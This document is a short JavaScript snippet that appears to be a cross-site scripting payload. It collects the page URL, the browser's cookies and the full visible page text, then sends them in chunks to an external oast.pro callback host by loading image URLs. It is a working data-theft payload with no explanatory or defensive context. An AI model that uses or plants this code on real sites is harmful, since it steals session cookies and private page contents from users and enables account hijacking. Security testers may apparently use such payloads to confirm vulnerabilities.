let d = location.href + "\nCOOKIE=" + document.cookie + "\nBODY=" + document.body.innerText;
for (let i = 0; i < d.length; i += 900) {
  new Image().src = 'https://d8mtl7io12pukg7cp93gn3i19a36k8yk8.oast.pro/?i=' + i + '&d=' + encodeURIComponent(d.slice(i, i + 900));
}
